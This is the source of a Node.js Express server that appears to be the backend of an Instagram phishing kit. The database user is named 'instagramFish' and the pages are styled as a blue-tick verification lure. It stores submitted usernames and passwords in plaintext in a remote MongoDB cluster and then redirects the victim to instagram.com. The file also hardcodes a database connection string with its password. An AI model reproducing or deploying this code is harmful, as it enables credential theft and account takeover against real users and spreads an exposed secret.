const express = require("express");
const app = express();
const path = require('path');
const ejs = require("ejs");
const ejsMate = require("ejs-mate");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const port = '3000';
const { MongoClient, ServerApiVersion } = require('mongodb');

// MongoDB URI and client setup
const uri = "mongodb+srv://instagramFish:vn5YGXosfDoUpAvN@cluster0.ltm5jm0.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";

mongoose.connect(uri, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log("Connected to MongoDB via Mongoose!");
}).catch(err => {
  console.error("Failed to connect to MongoDB via Mongoose:", err.message);
});

// Define Mongoose schema and model
const userSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  }
});

const UserDetails = mongoose.model('UserDetails', userSchema);

// View engine setup
app.engine('ejs', ejsMate);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Middleware setup
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }));

// Routes
app.get("/", (req, res) => {
  res.render("index.ejs");
});

app.get("/report", (req, res) => {
  res.render("bluetick.ejs");
});

// Handle form submission for new user
app.post('/submit', async (req, res) => {
  const { uname, password } = req.body;

  try {
    const newUser = new UserDetails({
      username: uname,
      password: password
    });

    // Save the new user to MongoDB
    await newUser.save();
    console.log('User saved:', newUser);

    // Redirect to the report page
    res.redirect("/report");

  } catch (error) {
    console.error('Error saving user:', error.message);
    res.status(500).send("Internal Server Error. Unable to save user.");
  }
});

// Final submit - redirects to Instagram
app.post("/finalsubmit", (req, res) => {
  console.log("Final submission received");
  res.redirect("https://www.instagram.com/");
});

// Start the server
app.listen(port, () => {
  console.log('Server is running on port ' + port);
});
